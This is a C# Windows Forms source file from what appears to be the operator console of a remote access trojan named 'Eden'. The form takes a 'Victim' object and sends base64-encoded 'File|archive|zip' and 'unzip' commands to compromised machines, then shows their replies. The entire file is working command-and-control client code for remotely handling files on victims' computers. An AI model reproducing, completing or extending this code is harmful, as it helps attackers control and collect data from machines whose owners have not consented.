using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileArchive : Form
    {
        private Victim m_victim { get; set; }
        private List<frmFileMgr.stEntryTag> m_lstEntry { get; set; }
        private bool m_bCompress { get; set; }

        public frmFileArchive(Victim victim, List<frmFileMgr.stEntryTag> lstEntry, bool bCompress)
        {
            InitializeComponent();

            m_victim = victim;
            m_lstEntry = lstEntry;
            m_bCompress = bCompress;
        }

        private enum enUnzipMethod
        {
            IndividualFolder, //Extract all file into
            CurrentFolder, //Extract all entries into current folder.
        }

        private frmFileMgr.stEntryTag fnGetItemTag(ListViewItem item) => (frmFileMgr.stEntryTag)item.Tag;

        private void fnRecv(Client clnt, string szVictimID, string[] asMsg)
        {
            try
            {
                if (!string.Equals(szVictimID, m_victim.m_szID))
                    return;

                if (asMsg[0] == "file" && asMsg[1] == "archive")
                {
                    if (asMsg[2] == "zip")
                    {
                        int nCode = int.Parse(asMsg[3]);
                        if (nCode == 1)
                        {
                            string[] asEntry = asMsg[4].Split(',').Select(x => EZCrypto.Encoder.b64d2str(x)).ToArray();
                            string szArchiveFilePath = asMsg[5];

                            foreach (string szName in asEntry)
                            {
                                Invoke(new Action(() =>
                                {
                                    ListViewItem item = listView1.FindItemWithText(Path.GetFileName(szName));
                                    if (item == null)
                                        return;

                                    item.SubItems[1].Text = "OK";
                                }));
                            }

                            MessageBox.Show("Action successfully, archive path: " + szArchiveFilePath, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else
                        {
                            MessageBox.Show(asMsg[4], "ArchiveCompress", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                    else if (asMsg[2] == "unzip")
                    {
                        int nCode = int.Parse(asMsg[3]);
                        if (nCode == 1)
                        {
                            string[] asArchiveFilePath = asMsg[4].Split(',').Select(x => EZCrypto.Encoder.b64d2str(x)).ToArray();

                            foreach (string szName in asArchiveFilePath)
                            {
                                Invoke(new Action(() =>
                                {
                                    ListViewItem item = listView2.FindItemWithText(Path.GetFileName(szName));
                                    if (item == null)
                                        return;

                                    item.SubItems[1].Text = "OK";
                                }));
                            }

                            MessageBox.Show("Action successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        }
                        else
                        {
                            MessageBox.Show(asMsg[4], "ArchiveDecompress", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "FileArchive", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void fnSetup()
        {
            tabControl1.SelectedIndex = m_bCompress ? 0 : 1;

            foreach (var entry in m_lstEntry)
            {
                ListViewItem item = new ListViewItem(Path.GetFileName(entry.szFullName));
                item.SubItems.Add("?");
                item.Tag = entry;

                if (m_bCompress)
                    listView1.Items.Add(item);
                else
                    listView2.Items.Add(item);
            }

            textBox1.Text = clsTools.GetFileNameFromDatetime("zip");

            foreach (string szMethod in Enum.GetNames(typeof(enUnzipMethod)))
                comboBox1.Items.Add(szMethod);

            comboBox1.SelectedIndex = 0;

            m_victim.m_clnt.ServerMessageReceived += fnRecv;
        }

        private void frmFileArchive_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var lEntry = listView1.Items.Cast<ListViewItem>().Select(x => fnGetItemTag(x)).ToList();
            if (lEntry.Count == 0)
                return;

            Task.Run(() =>
            {
                List<string> lsFolder = lEntry.Where(x => x.bDirectory).Select(x => x.szFullName).ToList();
                List<string> lsFile = lEntry.Where(x => !x.bDirectory).Select(x => x.szFullName).ToList();

                m_victim.fnSendCommand(string.Join("|", new string[]
                {
                    "File",
                    "archive",
                    "zip",
                    string.Join(",", lsFolder.Select(x => EZCrypto.Encoder.stre2b64(x))),
                    string.Join(",", lsFile.Select(x => EZCrypto.Encoder.stre2b64(x))),
                }));
            });
        }

        private void frmFileArchive_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_clnt.ServerMessageReceived -= fnRecv;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            var lEntry = listView2.Items.Cast<ListViewItem>().Select(x => fnGetItemTag(x)).ToList();
            if (lEntry.Count == 0)
                return;

            int nIdx = comboBox1.SelectedIndex;

            Task.Run(() =>
            {
                m_victim.fnSendCommand(string.Join("|", new string[]
                {
                    "File",
                    "archive",
                    "unzip",
                    nIdx.ToString(),
                    string.Join(",", lEntry.Select(x => EZCrypto.Encoder.stre2b64(x.szFullName))),
                }));
            });
        }
    }
}
